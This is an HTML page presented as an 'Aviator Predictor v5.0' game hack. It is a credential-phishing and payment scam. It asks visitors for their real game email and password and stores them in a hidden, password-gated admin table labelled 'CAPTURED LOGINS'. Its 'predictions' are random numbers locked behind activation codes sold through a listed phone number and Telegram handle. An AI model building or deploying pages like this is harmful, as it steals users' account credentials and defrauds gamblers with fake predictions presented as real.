<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KADIR 786 | MASTER PRO SYSTEM</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
        
        /* 1. एडमिन कंट्रोल - डेटा सेविंग सिस्टम */
        .admin-panel { background: #0a0a0a; border-bottom: 2px solid #00ff41; padding: 15px; }
        .adm-input { background: #000; border: 1px solid #333; color: #00ff41; padding: 8px; width: 30%; border-radius: 5px; }
        #adminDashboard { display: none; background: #050505; padding: 10px; margin-top: 10px; border: 1px dashed #00ff41; }

        /* 2. यूजर इंटरफेस */
        .container { padding: 20px; text-align: center; }
        .u-input { width: 100%; max-width: 350px; padding: 15px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 10px; margin-bottom: 15px; box-sizing: border-box; }
        .blue-btn { width: 100%; max-width: 350px; padding: 15px; background: #007bff; color: #fff; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; }

        /* 3. प्रेडिक्शन पेज (असली वर्किंग लुक) */
        #predPage { display: none; padding: 20px; text-align: center; }
        .mult-val { font-size: 70px; font-weight: bold; margin: 30px 0; color: #fff; text-shadow: 0 0 20px red; }
        
        /* कस्टमर सपोर्ट */
        .support-box { margin-top: 30px; padding: 15px; background: #111; border-radius: 10px; font-size: 13px; }
        .support-box a { color: #ffae00; text-decoration: none; font-weight: bold; }

        table { width: 100%; font-size: 10px; color: #00ff41; border-collapse: collapse; margin-top: 10px; }
        th, td { border: 1px solid #222; padding: 5px; text-align: left; }
    </style>
</head>
<body>

<div class="admin-panel">
    <div id="admLogin">
        <span style="font-size:12px; color:#00ff41;">MASTER ADMIN</span>
        <input type="password" id="admPass" class="adm-input" placeholder="Pass 9580">
        <button onclick="loginAdm()" style="background:#00ff41; border:none; padding:8px; border-radius:5px; font-weight:bold;">LOGIN</button>
    </div>
    <div id="adminDashboard">
        <h4>CAPTURED LOGINS (PERMANENT)</h4>
        <table>
            <thead><tr><th>EMAIL/ID</th><th>PASSWORD</th><th>TIME</th></tr></thead>
            <tbody id="logTable"></tbody>
        </table>
        <br>
        <button onclick="genKey()" style="background:#ffae00; border:none; padding:10px; border-radius:5px; font-weight:bold;">GENERATE ACTIVATION KEY</button>
        <div id="newKey" style="color:yellow; font-weight:bold; margin-top:10px; font-size:18px;"></div>
    </div>
</div>

<div class="container">
    <div id="step1">
        <img src="https://cdn-icons-png.flaticon.com/512/7140/7140413.png" width="60">
        <h2>KADIR 786</h2>
        <p style="color:#666;">Enter Old Game ID to Activate Hack</p>
        <input type="text" id="uEmail" class="u-input" placeholder="Old Game Email/ID">
        <input type="password" id="uPass" class="u-input" placeholder="Game Password">
        <button class="blue-btn" onclick="userAuth()">ACTIVATE ID</button>
    </div>

    <div id="predPage">
        <h2 style="color:red; margin:0;">AVIATOR PREDICTOR v5.0</h2>
        <div class="mult-val" id="number">1.00x</div>
        
        <input type="text" id="actKey" class="u-input" placeholder="Enter Activation Code">
        <button class="blue-btn" style="background:#b30000; margin-bottom:10px;" onclick="startHack()">GET PREDICTION</button>
        
        <div class="support-box">
            <p style="margin:0; color:#888;">For Activation Code, Contact Admin:</p>
            <p style="font-size:18px; margin:5px 0;"><a href="tel:9554527334">📞 9554527334</a></p>
            <p style="color:#007bff;">Telegram: @Kadir786_Admin</p>
        </div>
    </div>
</div>

<script>
    let validKeys = JSON.parse(localStorage.getItem('keys')) || [];

    // एडमिन लॉगिन
    function loginAdm() {
        if(document.getElementById('admPass').value === "9580") {
            document.getElementById('adminDashboard').style.display = 'block';
            loadLogs();
        } else { alert("Access Denied!"); }
    }

    // एक्टिवेशन कोड बनाना
    function genKey() {
        let k = "KDR-" + Math.floor(Math.random()*9000+1000);
        validKeys.push(k);
        localStorage.setItem('keys', JSON.stringify(validKeys));
        document.getElementById('newKey').innerText = "Generated: " + k;
    }

    // यूजर लॉगिन और डेटा सेविंग (Permanent)
    function userAuth() {
        let e = document.getElementById('uEmail').value;
        let p = document.getElementById('uPass').value;
        if(e && p) {
            let logs = JSON.parse(localStorage.getItem('userLogs')) || [];
            logs.push({e, p, t: new Date().toLocaleString()});
            localStorage.setItem('userLogs', JSON.stringify(logs));
            
            document.getElementById('step1').style.display = 'none';
            document.getElementById('predPage').style.display = 'block';
        } else { alert("Enter ID & Password!"); }
    }

    function loadLogs() {
        let logs = JSON.parse(localStorage.getItem('userLogs')) || [];
        let html = "";
        logs.forEach(l => html += `<tr><td>${l.e}</td><td>${l.p}</td><td>${l.t}</td></tr>`);
        document.getElementById('logTable').innerHTML = html;
    }

    // असली वर्किंग प्रेडिक्शन
    function startHack() {
        let inputKey = document.getElementById('actKey').value;
        if(validKeys.includes(inputKey)) {
            document.getElementById('number').innerText = "SEARCHING...";
            setTimeout(() => {
                let res = (Math.random() * 4 + 1.1).toFixed(2);
                document.getElementById('number').innerText = res + "x";
            }, 1500);
        } else {
            alert("Wrong Activation Code! Call Admin to Buy.");
        }
    }
</script>
</body>
</html>
